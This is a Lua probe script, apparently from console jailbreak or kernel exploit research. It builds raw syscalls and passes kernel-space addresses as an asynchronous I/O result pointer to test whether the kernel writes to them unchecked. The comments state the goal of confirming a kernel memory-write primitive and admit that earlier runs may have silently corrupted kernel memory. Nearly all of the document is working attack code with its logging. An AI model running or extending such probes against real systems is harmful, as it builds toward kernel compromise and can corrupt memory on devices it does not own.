-- CRASH_CLASS: HIGH
-- PROBE 749a: is the aio result pointer really range-checked against kernel space?
--
-- 744b: the result pointer at 0x1000 killed the process, so the store happens
-- there. 745a: the result pointer at 0xfffffe0000000000 (DMAP base) and at
-- 0xffffffffff000000 both completed to state 3, delete 0, and the process
-- stayed alive. Two readings fit that:
--   (1) the address is range-checked and rejected before the store, or
--   (2) the store was attempted and those two addresses happen to be mapped,
--       in which case we silently corrupted kernel memory and never noticed.
-- The DMAP base is certainly mapped. An address far outside the direct map is
-- certainly not. If the store is attempted, an unmapped kernel address faults
-- and the process dies the way it did at user 0x1000. If it is checked, the
-- request completes with an error record and we stay alive.
--
-- 0xfffffe8000000000 is 512 GiB above the DMAP base: physical 0x8000000000,
-- far beyond console RAM, so the page table entry cannot exist.
-- A second probe of 0xffffd00000000000 sits outside the direct map entirely.
-- Every other address here is our own mapped page.

print("=== PROBE 749a: AIO RESULT RANGE CHECK ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_write = mk(4); local sc_pair = mk(135)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
print("[A] pid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

local pf = to_num(memory.alloc(64))
print("[A] socketpair -> "..tostring(call(sc_pair, 1, 1, 0, pf, 0, 0)))
local s0 = rd(pf); local s1 = rd(pf+4)
local D = to_num(memory.alloc(0x4000)); local buf = to_num(memory.alloc(0x4000)); local res = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x4000); zero(buf,0x4000); zero(res,0x4000); zero(st,0x400); zero(ds,0x400)
local w = to_num(memory.alloc(64))
for k=0,3 do wd(w+k*4, 0x5A5A5A5A) end
print("[A] feed -> "..tostring(call(sc_write, s1, w, 16, 0, 0, 0)))

local function attempt(tag, r, feed)
    zero(D,0x100); zero(res,0x40); wd(buf, 0x11111111)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(16))
    wq(D+0x10, uint64(buf)); wq(D+0x18, uint64(r))
    wd(D+0x20, s0); wd(D+0x24, 0)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(cr), id))
    if id == 0 or id == -1 then return false end
    if feed then print(string.format("%s feed -> %s", tag, tostring(call(sc_write, s1, w, 16, 0, 0)))) end
    sleep_ms(60)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state=%08X buf=%X", tag, rd(st), rd(buf)))
    wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
    print(string.format("%s delete=%08X", tag, rd(ds)))
    return true
end

print("[B] control: result in our own page")
attempt("[B] control", res, true)
print("[C] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

print("[D] result at 0xfffffe8000000000 (unmapped direct map)")
attempt("[D] dmap-hole", 0xFFFFFE8000000000, false)
print("[E] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

print("[F] result at 0xffffd00000000000 (outside the direct map)")
attempt("[F] kernel-far", 0xFFFFD00000000000, false)
print("[G] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 749a DONE ===")
